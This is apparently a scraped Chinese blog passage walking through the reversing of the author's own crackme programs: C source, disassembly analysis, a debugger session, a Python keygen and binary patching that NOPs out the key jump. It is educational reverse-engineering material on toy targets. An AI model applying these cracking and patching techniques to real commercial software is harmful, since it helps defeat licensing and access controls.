return -1; } bufptr = *lineptr; size = *n; c = fgetc(stream); if (c == EOF) { return -1; } if (bufptr == NULL) { bufptr = malloc(128); if (bufptr == NULL) { return -1; } size = 128; } p = bufptr; while (c != EOF) { if ((p - bufptr) \u0026gt; (size - 1)) { size = size + 128; bufptr = realloc(bufptr, size); if (bufptr == NULL) { return -1; } } *p++ = c; if (c == \u0026#39;\\n\u0026#39;) { break; } c = fgetc(stream); } *p++ = \u0026#39;\\0\u0026#39;; *lineptr = bufptr; *n = size; return p - bufptr - 1; } size_t r_trim(char *str, size_t len) { size_t slen = strnlen(str, len); for (size_t i = slen - 1; i \u0026gt;= 0; i++) { if (str[i] == \u0026#39; \u0026#39; || str[i] == \u0026#39;\\n\u0026#39; || str[i] == \u0026#39;\\r\u0026#39;) { str[i] = \u0026#39;\\0\u0026#39;; } else { break; } } return strnlen(str, len); } char *calculate(char *username, const size_t username_len) { // 初始化固定8字节计算密钥的空间  const size_t input_buf_len = 8; char *input_buf = malloc(input_buf_len); for (size_t i = 0; i \u0026lt; input_buf_len; i++) { input_buf[i] = 0x52 + i; } // 用用户输入替换初始化的数据  memcpy_s(input_buf, input_buf_len, username, username_len); // 异或处理  for (size_t i = 0; i \u0026lt; input_buf_len; i++) { input_buf[i] ^= 0x25; } // 初始化 Hex 输出  const size_t output_buf_len = 17; char *output_buf = malloc(output_buf_len); // 转为可读字符串  for (size_t i = 0; i \u0026lt; input_buf_len; i++) { sprintf(\u0026amp;output_buf[i * 2], \u0026#34;%02x\u0026#34;, input_buf[i]); } output_buf[16] = 0; free(input_buf); return output_buf; } int main() { while (1) { char *username = NULL; size_t username_len = 0; char *serial = NULL; size_t serial_len = 0; size_t linesize = 0; printf(\u0026#34;username:\u0026#34;); linesize = getline(\u0026amp;username, \u0026amp;username_len, stdin); username_len = r_trim(username, linesize); if (username_len \u0026gt; 8) { free(username); puts(\u0026#34;username less than 8 letter\u0026#34;); continue; } else if (username_len == 0) { free(username); continue; } printf(\u0026#34;serial:\u0026#34;); linesize = getline(\u0026amp;serial, \u0026amp;serial_len, stdin); serial_len = r_trim(serial, linesize); if (serial_len != 16) { free(username); free(serial); puts(\u0026#34;serial has 16 letters\u0026#34;); continue; } char *correct = calculate(username, username_len); int rc = strncmp(serial, correct, 16); if (rc == 0) { free(correct); puts(\u0026#34;Good job!\u0026#34;); break; } else { puts(\u0026#34;wrong pwd!\u0026#34;); } free(username); free(serial); free(correct); } return 0; }   编译方式是\n1 2 3  clang main.c -o cm02-easy.exe -Wall -m32 -O0 clang main.c -o cm02-normal.exe -Wall -m32 -O1 clang main.c -o cm02-hard.exe -Wall -m32 -O2   0x02 观察 启动后观察行为（不截图了。）\n1 2 3 4 5 6 7 8 9 10 11 12 13  weakptr in cm02 ❯ .\\cm02-easy.exe username:abc serial:123456 serial 长度为16 username:abc serial:123456789012345 wrong pwd! username: serial: serial 长度为16 username:abc serial:aaaaaaaaaaaaaaa wrong pwd!   这次的目标是：\n 得到某个用户名对应的序列号（serial）。 破解，总是正确或对任何输入都提示正确。 注册机。  0x03 静态分析 - easy 3.1 主循环 在公司没IDA，用 Cutter 打开，在上方输入框输入 main 跳转到 main 函数。\n然后点击 图表（main） 进入类似 IDA 的控制流视图。\n之后就能看到下面的控制流了。\neasy难度下没有开启任何编译器优化，控制流和原始代码能直接对应上。瞧着困难很多对吧？\n先简单扫一眼，会发现很多分支直接跳回了0x0040139d，也就是从上往下数第二个代码块，基本每个跳转都是下一个块或跳回这个块。按照 cm01的经验，我们先找到关键的一跳。可以直接搜索字符串引用（wrong pwd!），也可以逐个代码块看下去。\n很快，右下角的关键跳出现在眼前。\n接着回头看跳转条件。\n虽然没有名字，但fcn.00403ef4 是老熟人了。三个参数，ecx、eax、0x10，返回结果和0做比较，jne条件跳转。\n cmp指令，操作数相减（dest-src），结果存入标志位 SF和ZF。  结果是负数（dest\u0026lt;src），SF也就是结果符号位设置为1。 结果是正数（dest\u0026gt;src），SF也就是结果符号位设置为0。 结果是0（dest=src），ZF设置为1。   jne或jnz指令，非零跳转。ZF标志位为1时跳转。  猜测这个函数应该是strncmp。继续往回看参数是怎么来的。\neax来自sub.02x_40298c这个函数，后面两个脱裤子放屁的mov忽略。ecx则来来自mov ecx,dword [ebp-10h]这一行。\n先不着急分析函数，继续往回找，找到[ebp-10h]的来源。\n在入口点附近，看到[ebp-10]被初始化成了0。\n因为没有很明确的路径，手动计算栈上偏移又非常麻烦，这里本应该掏出调试器——但出于学习练手的目的，还是先尝试计算下。首先回顾下简化的栈内存布局，从上往下增长，如图。\n接下来从mov ebp,esp开始，往下列出所有函数调用，捋一捋逻辑。\n第一个框，[esp+2ch+Ix] 计算结果是 [esp]，也就是栈顶，栈顶设置为字符串 username:，接着调用一个未知函数。从参数判断我们先认为是一个输出字符串的函数。\n再看第二个框，acrt_iob_func，百度一下就会发现，__acrt_iob_func函数是定义于 c 运行库里的函数，作用是返回 stdin/stdout/stderr 。栈顶设置为0，所以获得的是 stdin。\n再看第三个框，edx和ecx赋值为栈上两个变量的地址，再为参数。按顺序就是f(edx,ecx,stdin)。暂时不明。函数返回值被赋值回了[ebp-18h]。\n第四个框，从第三个框得到的返回值被当参数传给一个未知函数。f([ebp-8h], [ebp-18h])，返回值被赋值回 [ebp-0Ch]。\n结合最后的 cmp 和 jbe 指令分析，人肉反编译后用伪代码表示，就是下面这样。jbe指令只在cmp左操作数小于等于右操作数时执行跳转（CF标志位和ZF标志位其中一个为1时）。\n1 2 3 4 5 6 7 8 9  var var_8 # 偏移值 ebp-8h var var_0C # 偏移值 ebp-0Ch var var_18 # 偏移值 ebp-18h print(\u0026#34;username:\u0026#34;) var_18 = unknown_func1(\u0026amp;var_8,\u0026amp;var_0c,stdin) var_0c = unknown_func2(var_8, var_18) if var_0c \u0026lt;= 8: ... # jbe 跳转执行   可以看出，当 var_0c 小于 8 时，提示 username less than 8 letter 。因此可以确定 [ebp-0Ch] 这个变量就是 username 字符串的长度，上一个函数会计算字符串长度返回。我们再根据这个发现修改下伪代码。\n1 2 3 4 5 6 7 8 9 10 11 12  var var_8 # 偏移值 ebp-8h var username_len # 偏移值 ebp-0Ch var var_18 # 偏移值 ebp-18h print(\u0026#34;username:\u0026#34;) var_18 = unknown_func1(\u0026amp;var_8,\u0026amp;username_len,stdin) # var_8 可能是 username 指针 username_len = unknown_func2(var_8, var_18) # 计算字符串长度 if username_len \u0026lt;= 8: ... # jbe 跳转执行 else: # jmp 到开头   第一个未知函数看起来已经呼之欲出了，stdin和\u0026amp;username_len作为参数，var_8 有极大可能就是username字符串指针。不过在进入调试器前，还不能马上下结论，继续看正确跳转的代码。\n1 2  cmp [ebp-0Ch], 0 jnz ...   这次是比较用户名长度和0，非0跳转。\n可以看到为零时，经过一个未知函数 sub_4036FC(var_8) 后，跳回开头。\n继续看正确流程，jmp $+5 ，$ 表示当前正在执行的代码在代码段内的偏移量，+5就是从当前代码开始往后跳过5个字节，我们直接看IDA分析好的跳转位置。\n又是非常熟悉的代码，和读取 username 的分析方式相同，以相同的顺序调用相同的函数，可以得到var_14是serial_len，Str1可能是serial字符串指针。不做重复分析，继续往下看。\n右边的代码块是关于长度的判断，分析方法不再重复。左侧代码就是我们的关键跳转了，其中出现两个函数调用。\n1 2 3 4 5 6  mov eax, [ebp+var_C] mov ecx, [ebp+Block] mov [esp+2Ch+Ix], ecx ; void * mov [esp+2Ch+Str2], eax ; size_t call sub_401250 mov [ebp+var_1C], eax   var_c先前被判断是username_len，Block就是var_8，先前被怀疑是用户键入的用户名字符串指针。未知函数的返回值保存在 [ebp-1ch]中。\n这个1c在随后的代码中立刻被用到。\n1 2 3 4 5 6 7  mov eax, [ebp+var_1C] mov ecx, [ebp+Str1] mov [esp+2Ch+Ix], ecx ; Str1 mov [esp+2Ch+Str2], eax ; Str2 mov [esp+2Ch+MaxCount], 10h ; MaxCount call _strncmp mov [ebp+var_20], eax   Str1在serial输入这一步被怀疑是用户输入的序列号字符串指针，它和上一个函数调用返回的var_1c被作为参数传递给strncmp，字符串长度最大16字节。由此可见，var_1c基本可以确定是正确序列号的指针，之前的未知函数可能就是生成序列号的函数。\n下一步分析序列号生成函数。\n3.2 生成序列号 先看下控制流全览，能依稀分辨出三个循环。\n自动分析出的变量表\n1 2 3 4 5 6 7 8 9 10 11 12  ; var uint32_t var_1ch @ ebp-0x1c ; var int32_t var_18h @ ebp-0x18 ; var int32_t var_14h @ ebp-0x14 ; var uint32_t var_10h @ ebp-0x10 ; var uint32_t var_ch @ ebp-0xc ; var int32_t var_8h @ ebp-0x8 ; var int32_t var_4h @ ebp-0x4 ; arg uint32_t arg_8h @ ebp+0x8 ; arg int32_t arg_ch @ ebp+0xc ; var int32_t var_sp_4h @ esp+0x4 ; var int32_t var_sp_8h @ esp+0x8 ; var int32_t var_sp_ch @ esp+0xc   先看循环外的代码，简单按用途划一下分隔线。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  0x004071f0 push ebp 0x004071f1 mov ebp, esp 0x004071f3 sub esp, 0x2c ; --- 0x004071f6 mov eax, dword [arg_ch] 0x004071f9 mov eax, dword [arg_8h] ; --- 0x004071fc mov dword [var_4h], 8 ; --- 0x00407203 mov dword [esp], 8 0x0040720a call fcn.00401302 0x0040720f mov dword [var_8h], eax ; --- 0x00407212 mov dword [var_ch], 0   开头是惯例的两句栈帧准备动作，随后开辟 0x2c 大小的栈空间。\n两个没用的 mov eax,...，之后是[ebp-4h]设置为8，再把8作为参数调用了一个未知函数，返回值赋值给[ebp-8h]，再初始化[ebp-ch]为 0。伪代码表示就是下面这样。\n1 2 3 4  int var_4h, var_8h， var_ch; // ebp-4h, ebp-8h, ebp-ch var_4h = 0x8; var_8h = unknown_func(0x8); var_ch = 0x0;   然后是一个条件跳转。\n1 2  0x00407219 cmp dword [var_ch], 8 0x0040721d jae 0x407242   学习下jae指令。jae指令和jnc指令相同，CF=0则跳转。jae 可以看作 Jump if above or equals。上一句 cmp 计算 var_ch - 0x8 ，对相关标志位赋值。jae指令根据CF标志位判断，由于cmp指令是减法，所以判断的是减法中有没有出现 借位 。\n简单的描述就是，cmp ax, bx，如果ax \u0026lt; bx 则 CF=1，如果 ax \u0026gt;= bx 则 CF=0。\n因为我们知道 var_ch 刚被初始化成了0，不成立，继续看不成立的分支。\n1 2 3 4 5 6 7 8 9 10 11 12  0x00407223 mov eax, dword [var_ch] 0x00407226 add eax, 0x52 ; 82 0x00407229 mov dl, al ; --- 0x0040722b mov eax, dword [var_8h] 0x0040722e mov ecx, dword [var_ch] 0x00407231 mov byte [eax + ecx], dl ; --- 0x00407234 mov eax, dword [var_ch] 0x00407237 add eax, 1 0x0040723a mov dword [var_ch], eax 0x0040723d jmp 0x407219   把var_ch移入寄存器eax后，加上0x52，又移动al到dl。后续eax被用作别的用途，这一番操作其实就是给dl赋值了一个(int16_t)0x52+var_ch。\n随后把var_8h和var_ch相加后的地址赋值 dl，也就是0x52。\n接着var_ch自增1，跳回 jae判断前的 cmp，形成循环，我们用伪代码表示。\n1 2 3 4 5 6 7 8  int var_4h, var_8h， var_ch; // ebp-4h, ebp-8h, ebp-ch var_4h = 0x8; var_8h = unknown_func(0x8); var_ch = 0x0; while(var_ch \u0026lt; 8) { *(var_8h + var_ch) = 0x52 + var_ch; var_ch++; }   从结构上看，是一个典型的 for 循环。 var_8h 是一个未知函数返回的指针。我们稍微改下伪代码。\n1 2 3 4 5 6 7  int var_4h, var_8h; // ebp-4h, ebp-8h var_4h = 0x8; var_8h = unknown_func(0x8); for (int var_ch=0; var_ch \u0026lt; 8; var_ch++) { // var_ch -\u0026gt; ebp-ch  var_8h[var_ch] = 0x52 + var_ch; }   接着继续看循环结束后的代码。\n1 2 3 4 5 6 7 8 9 10  0x00407242 mov eax, dword [arg_ch] ; ebp+ch 函数右往左数第二个入参 0x00407245 mov ecx, dword [arg_8h] ; ebp+8h 函数右往左数第一个入参 0x00407248 mov edx, dword [var_8h] ; ebp-8h ; --- 0x0040724b mov dword [esp], edx 0x0040724e mov dword [var_sp_4h], 8 0x00407256 mov dword [var_sp_8h], ecx 0x0040725a mov dword [var_sp_ch], eax 0x0040725e call fcn.00407310 0x00407263 mov dword [var_10h], 0   从之前分析主循环的代码，我们可以发现 arg_8h 其实是用户名字符串指针，arg_ch是用户名字符串长度。\n接着这两个入参，和 var_8h，也就是之前得到指针，传入一个未知函数，随后再初始化了一个变量 var_10h。\n伪代码如下。\n1 2  unknown_func(var_8h, 0x8, username, username_len); // 猜测的函数签名 func(void*, int, void*, int) int var_10h = 0;   接着又是一个条件跳转。\n1 2  0x0040726a cmp dword [var_10h], 8 0x0040726e jae 0x407292   和先前的循环相同，不作重复分析，直接进入循环体。\n1 2 3 4 5 6 7 8 9 10 11  0x00407274 mov eax, dword [var_8h] 0x00407277 mov ecx, dword [var_10h] 0x0040727a movsx edx, byte [eax + ecx] 0x0040727e xor edx, 0x25 ; 37 0x00407281 mov byte [eax + ecx], dl ; --- 0x00407284 mov eax, dword [var_10h] 0x00407287 add eax, 1 0x0040728a mov dword [var_10h], eax ; --- 0x0040728d jmp 0x40726a   前两条指令没什么可说的，movsx还是第一次见，学习下。\nmovsx 从来源取数，不足的部分用来源的符号位填充，这里取的是var_8h[var_10h]，一字节，到 edx 寄存器。movsx的好处是可以保留符号位，加载不同大小的数据时（比如来源是 word，目标是 dword），如果来源是负数，则填充符号位可以正确表示补码形式表示的负数。\n从var_8h[var_10h]取数移入edx 后，之后是一句简单的 xor，逻辑异或运算。之后将xor运算结果取低位1字节（dl寄存器）移回var_8h[var_10h]。\n之后自增，跳转循环，和之前的循环一样。将分析过的部分用伪代码表示如下。\n1 2 3 4 5 6 7 8 9 10 11 12  int var_4h, var_8h; // ebp-4h, ebp-8h var_4h = 0x8; var_8h = unknown_func(0x8); for (int var_ch=0; var_ch \u0026lt; 8; var_ch++) { // var_ch -\u0026gt; ebp-ch  var_8h[var_ch] = 0x52 + var_ch; } unknown_func(var_8h, 0x8, username, username_len); // 猜测的函数签名 func(void*, int, void*, int) for(int var_10h=0; var_10h \u0026lt; 8; var_10h++) { // var_10h -\u0026gt; ebp-10h  var_8h[var_10h] ^= 0x25; }   继续看循环结束后的动作。\n1 2 3 4 5  0x00407292 mov dword [var_14h], 0x11 ; 17 0x00407299 mov dword [esp], 0x11 ; [0x11:4]=-1 ; 17 0x004072a0 call fcn.00401302 0x004072a5 mov dword [var_18h], eax 0x004072a8 mov dword [var_1ch], 0   调用一个函数，返回值赋值给var_18h，同时初始化var_1ch为 0。伪代码表示如下。\n1 2 3  int var_14h = 0x11; var_18h = unknown_func(0x11); int var_1ch = 0x0;   接下来又是一个循环。\n1 2  0x004072af cmp dword [var_1ch], 8 0x004072b3 jae 0x4072f2   不重复分析，进入循环体。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  0x004072b9 mov eax, dword [var_8h] 0x004072bc mov ecx, dword [var_1ch] 0x004072bf movsx eax, byte [eax + ecx] 0x004072c3 mov edx, dword [var_18h] 0x004072c6 mov ecx, dword [var_1ch] ; --- 0x004072c9 shl ecx, 1 0x004072cc add edx, ecx ; --- 0x004072ce lea ecx, str.02x ; 0x45de50，内容是 %02x ; --- 0x004072d4 mov dword [esp], edx 0x004072d7 mov dword [var_sp_4h], ecx 0x004072db mov dword [var_sp_8h], eax 0x004072df call fcn.00403dcd ; --- 0x004072e4 mov eax, dword [var_1ch] 0x004072e7 add eax, 1 0x004072ea mov dword [var_1ch], eax 0x004072ed jmp 0x4072af   依然是从 var_8h[var_1ch] 取数，之后把 var_18h 和 var_1ch 也取数，分别放到 eax、edx、ecx。\n接着是一个没见过的命令，shl，学习下。\nshl是逻辑左移，和 c 中的 \u0026lt;\u0026lt; 运算符一样，两个操作数，命令格式shl 寄存器,立即数。\n这里做的就是 ecx，也就是 var_1ch 的值左移1位，众所周知左移n位可以看作乘上2^n^ ，所以这句 shl 其实就是 var_1ch*2。左移后结果加到了edx，edx是var_18h。\n之后是一个lea，加载地址，内容是常量字符串 %02x，看起来是一个 c 格式化字符串。\n接着压栈传参，调用未知函数，结果忽略。伪代码表示如下。\n1  unknown_func(var_18h + var_1ch * 2, \u0026#34;%02x\u0026#34;, var_8h[var_1ch]);   随后是变量自增，跳转回循环开头。\n我们把分析出来的伪代码再合并下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  int var_4h, var_8h; // ebp-4h, ebp-8h var_4h = 0x8; var_8h = unknown_func(0x8); for (int var_ch=0; var_ch \u0026lt; 8; var_ch++) { // var_ch -\u0026gt; ebp-ch  var_8h[var_ch] = 0x52 + var_ch; } unknown_func(var_8h, 0x8, username, username_len); // 猜测的函数签名 func(void*, int, void*, int) for(int var_10h=0; var_10h \u0026lt; 8; var_10h++) { // var_10h -\u0026gt; ebp-10h  var_8h[var_10h] ^= 0x25; } int var_14h = 0x11; var_18h = unknown_func(0x11); for(int var_1ch = 0x0; var_1ch \u0026lt; 8; var_1ch++) { unknown_func(var_18h + var_1ch * 2, \u0026#34;%02x\u0026#34;, var_8h[var_1ch]); }   最后是循环结束后的代码。\n1 2 3 4 5 6 7 8 9 10 11 12  0x004072f2 mov eax, dword [var_18h] 0x004072f5 mov byte [eax + 0x10], 0 ; --- 0x004072f9 mov eax, dword [var_8h] 0x004072fc mov dword [esp], eax 0x004072ff call fcn.00402a36 ; --- 0x00407304 mov eax, dword [var_18h] ; --- 0x00407307 add esp, 0x2c 0x0040730a pop ebp 0x0040730b ret   首先是把var_18h[0x10] 的值设为0。\n接着var_8h做参数调未知函数。\n把var_18h移到eax，也就是cdecl约定下的返回值位置。\n最后平栈，恢复ebp，返回，函数结束。我们把所有内容的伪代码合并起来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int var_4h = 0x8; // ebp-4h void* var_8h = unknown_func(0x8); // ebp-8h  for (int var_ch=0; var_ch \u0026lt; 8; var_ch++) { // var_ch -\u0026gt; ebp-ch  var_8h[var_ch] = 0x52 + var_ch; } unknown_func(var_8h, 0x8, username, username_len); // 猜测的函数签名 func(void*, int, void*, int) for(int var_10h=0; var_10h \u0026lt; 8; var_10h++) { // var_10h -\u0026gt; ebp-10h  var_8h[var_10h] ^= 0x25; } int var_14h = 0x11; var_18h = unknown_func(0x11); for(int var_1ch = 0x0; var_1ch \u0026lt; 8; var_1ch++) { unknown_func(var_18h + var_1ch * 2, \u0026#34;%02x\u0026#34;, var_8h[var_1ch]); } var_18h[0x10] = 0; unknown_func(var_8h); return var_18h;   从这我们已经能看出具体算法了，未知函数可以猜测调试看看。\n0x04 调试器 - easy 调试的目标是确认生成序列号的算法，把分析出的伪代码中还不清楚用途的未知函数，分析出作用。\n4.1 x32dbg 打开调试器后，先找到关键跳，在工具栏点击字符串工具图标，在下方搜索栏输入wrong pwd!\n跳到引用位置。\n之后可以按g，进入控制流视图，不过这个控制流视图有点不好看，我们也可以直接参考静态分析中的汇编，直接找到函数，并在入口下断点。\n尝试随便输入一点内容，调试器命中。\n接下来就可以用左上角的单步调试了。\n不做更多介绍，汇编的分析已经进行过一次。这次我们找到对输入 \u0026ldquo;abc\u0026rdquo; 的正确序列号，完成一次解密。\n只需要在断点处点击按钮，然后观察eax寄存器。\n抄出来（居然不能右键复制后面的字符串），内容是4447467073727d7c。\n接着继续运行，再把抄出来的答案复制进去看看。\n到这里，我们拿到了一个可以用的序列号。\n0x05 注册机 5.1 Python 脚本注册机 先把前面的伪代码贴一下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int var_4h = 0x8; // ebp-4h void* var_8h = unknown_func(0x8); // ebp-8h  for (int var_ch=0; var_ch \u0026lt; 8; var_ch++) { // var_ch -\u0026gt; ebp-ch  var_8h[var_ch] = 0x52 + var_ch; } unknown_func(var_8h, 0x8, username, username_len); // 猜测的函数签名 func(void*, int, void*, int) for(int var_10h=0; var_10h \u0026lt; 8; var_10h++) { // var_10h -\u0026gt; ebp-10h  var_8h[var_10h] ^= 0x25; } int var_14h = 0x11; var_18h = unknown_func(0x11); for(int var_1ch = 0x0; var_1ch \u0026lt; 8; var_1ch++) { unknown_func(var_18h + var_1ch * 2, \u0026#34;%02x\u0026#34;, var_8h[var_1ch]); } var_18h[0x10] = 0; unknown_func(var_8h); return var_18h;   里面的未知函数（失策，clang默认静态链接了libcmt，很多库函数在x32dbg里认不出来）猜一猜吧。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  username = input(\u0026#39;username:\u0026#39;).encode() username_len = len(username) var_4h = 8 var_8h = bytearray(8) for i in range(8): var_8h[i] = 0x52 + i # 这里的未知函数通过调试器可以看出，把入参复制到了 var_8h 里 var_8h[:username_len] = username for i in range(8): var_8h[i] ^= 0x25 # for(int var_1ch = 0x0; var_1ch \u0026lt; 8; var_1ch++) { # unknown_func(var_18h + var_1ch * 2, \u0026#34;%02x\u0026#34;, var_8h[var_1ch]); # } # # 最后的那个循环中，函数判断为 sprintf 或其他啥，格式化明确是2位小写16进制数 # 前面的计算看作是算偏移，一个 var_8h 的字节对应 2 字节16进制表示，所以 var_18h 加上 NUL 一共是 0x11 也就是 17 个字节 # 循环的作用是把 var_8h 这个字节数组转换成16进制表示的字符串。 # # 在 python 里用 hex() 就行了。 print(var_8h.hex())   运行脚本，输入abc，输出4447467073727d7c，确认注册机可以生成序列号。\n0x06 修改 exe 6.1 x32dbg 修改关键跳 用调试器打开后找到决定serial是否正确的关键跳转，右键二进制选择用NOP填充，确认即可。\n修改后效果如图。\n接着把修改后的exe保存下来，在文件菜单里选择补丁。\n全选，点修补文件，选择路径保存。\n我保存在cm02-easy-patched.exe，接着我们试试运行。\n遗憾的是被x32dbg补丁功能导出的文件需要管理员权限运行，为了能截到图，图中用了名为sudo的工具命令，可以用scoop install sudo来安装sudo，点击去scoop首页。\n6.2 反编译器修改关键跳 以Cutter为例，找到jne指令后，右键修改为nop即可。记得先备份。\n修改后也能实现和x32导出一样的效果，而且不用管理员权限。\n结论 总得有个结论。\n这次逆向应该能帮助学到下面的东西：\n 栈帧结构和函数调用 cmp指令 jne、jbe、jnz、jae指令 movsx指令 shl指令  库函数因为静态链接的缘故已经变成了文中的未知函数，造成了分析上的障碍。老实说如果不是自己写的源码，能不能这么顺利逆向出注册机还真不好说。\n开启优化的 normal 和 hard 难度就不进一步分析了，有兴趣可以看看。\n","date":"2021-09-15T15:43:00+08:00","permalink":"https://nnnewb.github.io/blog/p/crackme-02/","title":"自娱自乐 crackme-02"},{"content":"前言 总之得有个前言。从前有个老和尚（不是，掉光了头发的攻城狮），\u0026hellip;\u0026hellip;\n以上略，于是作为萌新含量110%的萌新，出于练手、熟悉下反汇编调试的环境之类的目的，还是自己写crackme来把玩吧。\nCM01 介绍 于是这个 CrackMe 就叫 CM01 好了，命令行无界面。适合差不多对这些东西懂个大概或者打算学习的萌新：\n 反汇编/调试工具 寄存器（主要是 ebp、esp、eip、eax） 函数调用（cdecl） 栈/栈帧 内存模型和寻址  CM01 源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt; size_t getline(char **lineptr, size_t *n, FILE *stream) { char *bufptr = NULL; char *p = bufptr; size_t size; int c; if (lineptr == NULL) { return -1; } if (stream == NULL) { return -1; } if (n == NULL) { return -1; } bufptr = *lineptr; size = *n; c = fgetc(stream); if (c == EOF) { return -1; } if (bufptr == NULL) { bufptr = malloc(128); if (bufptr == NULL) { return -1; } size = 128; } p = bufptr; while (c != EOF) { if ((p - bufptr) \u0026gt; (size - 1)) { size = size + 128; bufptr = realloc(bufptr, size); if (bufptr == NULL) { return -1; } } *p++ = c; if (c == \u0026#39;\\n\u0026#39;) { break; } c = fgetc(stream); } *p++ = \u0026#39;\\0\u0026#39;; *lineptr = bufptr; *n = size; return p - bufptr - 1; } int main() { const char *pwd = \u0026#34;secret\u0026#34;; char *line = NULL; size_t len = 0; long int linesize = 0; while (1) { printf(\u0026#34;password:\u0026#34;); linesize = getline(\u0026amp;line, \u0026amp;len, stdin); int rc = strncmp(line, pwd, 6); if (rc == 0) { printf(\u0026#34;Good job!\\n\u0026#34;); break; } else { printf(\u0026#34;wrong pwd!\\n\u0026#34;); } } return 0; }   编译工具链：\n 因为VC++对单纯C的支持比较垃圾，所以用LLVM（Clang）-12.0.1，Clang  编译指令\n1 2 3  clang cm01.c -o cm01-easy.exe -m32 -O0 clang cm01.c -o cm01-normal.exe -m32 -O1 clang cm01.c -o cm01-hard.exe -m32 -O2   观察 假装没看到源码，先观察下程序的行为，确定目标。\n1 2 3 4 5 6 7  weakptr in assembly-play ❯ .\\cm01-easy.exe password:password? wrong pwd! password:asdf wrong pwd! password:wrong pwd! password:   一个 password: 提示符，随便输入了点什么会提示 wrong pwd! 。\n确定目标是找出正确的密码。\n静态分析 思路 在逆向中有个说法叫*“关键跳转”*，如分析固定密码，字符串比较后跳转成功或跳转失败就是关键跳。对于简单的问题，找到关键跳即可破局。\n反汇编 - Easy Easy难度下，-O0参数关闭了编译器优化，生成的汇编代码非常死板，基本能直接对照到C源码上。\n直接拿IDA打开。\n直接跳到了main函数。接着看IDA汇编窗口中的的细节。\nIDA反汇编界面是包含一些伪代码的，有助于分析。\n左侧有长条和箭头的部分是控制流示意，箭头指的就是跳转方向。\n越过伪代码的部分，就能看到函数体开头例行公事的部分了。随后的便是函数体代码。\n具体看函数体前，先了解下IDA还提供了另一种控制流可视化的视图，可以极大帮助对函数逻辑的分析。\n在汇编视图里右键，选择 Graph View，即可进入控制流视图。\n在图片左下角的是视图的全览，原本的汇编文本变成了图中箭头连接的小汇编代码块，箭头指示了跳转的方向。\n在这个视图可以很清楚地看到所谓的关键跳：\n_strncmp是经过了 name mangling 的 c 标准库函数strncmp，函数如名字所示，用途就是比较字符串。\n又根据cdecl调用约定，函数参数通过栈传递，参数从右往左压栈。我们看这个call指令前的三句mov。\n1 2 3  mov [esp+24h+Ix], ecx ; Str1 mov [esp+24h+Str2], eax ; Str2 mov [esp+24h+MaxCount], 6 ; MaxCount   需要注意的是没有用push指令，所以三个mov在栈上的顺序要根据偏移算。我们偷个懒直接看strncmp函数的签名就行，IDA也分析出了压栈的地址在注释里。往上看，看看ecx和eax又是哪儿来的。\n1 2  mov eax, [ebp+var_8] mov ecx, [ebp+Str1]   再看ebp+var_8和ebp+str1又是什么。\n1 2  lea eax, aSecret ; \u0026#34;secret\u0026#34; mov [ebp+var_8], eax   所以有一个参数是字符串 \u0026quot;secret\u0026quot;，作为关键跳前 _strncmp 的参数。\n让我们尝试一下。\n成功完成。\n反汇编 - Normal 接下来看使用-O1编译，开启了部分编译器优化的版本。\n可以看到，因为编译器优化的缘故，原本清晰的分支变成了一个仅有一个循环。\n还是先找到关键跳，肉眼过一遍循环中的函数调用，sub_401180从参数看应该是一个往终端打印字符串的函数，忽略。___acrt_iob_func意义不明也忽略。下一个sub_401000依然有点意义不明，先跳过。再往下就看到了老熟人了，_strncmp，\u0026quot;secret\u0026quot;参数更是直接用一个push给压栈了，分析到此结束？\n不过还有一个问题没解决：失败的提示我们看到了，成功的跳转在哪儿呢？\n从call _strncmp开始往下看。\n1 2 3 4 5 6 7 8 9 10  call _strncmp ; 调用，cdecl约定下，返回值在 eax add esp, 0Ch ; 清栈 mov esi, eax ; 函数返回值存入 esi test eax, eax ; TEST 指令把操作数按位与并设置标志位，如果 eax 是 0 则 ZF 会设置成 1，否则就是 0。 mov eax, offset aWrongPwd ; eax = \u0026#34;wrong pwd!\\n\u0026#34; ; ebp 被设置为了字符串 \u0026#34;Good job!\\n\u0026#34; ; cmovz 或者说 cmov* 系列的函数用后缀的单个字符表示用哪个标志位来决定是否mov，比如cmovz就是用ZF标志位决定是否执行mov。 cmovz eax, ebp push eax ; 如果 strncmp 返回 0 则是 Good job!\\n ，反则 wrong pwd!\\n call sub_401180 ; 调用一个输出字符串的函数   用伪代码来表示，就是\n1  print(\u0026#34;Good job!\\n\u0026#34; if compare_result == 0 else \u0026#34;wrong pwd!\\n\u0026#34;)   反汇编 - Hard Hard启用了-O2，也就是开启了大部分编译器优化。用IDA打开。\n因为编译器十分聪明地把一些函数给内联编译进了 main 函数，现在 main 函数的控制流已经乱的一批。挨个读下去虽然还可行，但实在费神费力。\n不过在这个条件下依然还有解决办法：我们可以通过错误或成功的提示字符串找关键跳。\n已知错误时会输出\u0026quot;wrong pwd!\u0026quot;，我们在IDA找到字符串视图。\n然后在视图中找到字符串。\n其实就是在内存数据段（Data Segment）或者PE的数据节（Data Section）中的字符串啦，一般手写的字符串字面量都会直接编译到这里。\n在我们要找的字符串上双击，就会跳到汇编视图中的字符串位置。\n然后再双击图中位置。\n即可跳转到引用。\n接着看跳转到的上下文，又变成了十分熟悉的正确错误分支。往前找到 _strncmp的参数。\n1 2 3 4 5  push 6 push offset Str2 ; \u0026#34;secret\u0026#34; push edx ; Str1 mov ebp, edx call _strncmp   也就是 strncmp(edx,\u0026quot;secret\u0026quot;,6)，密钥就是 \u0026quot;secret\u0026quot;没错了。\n总结 这个 CrackMe 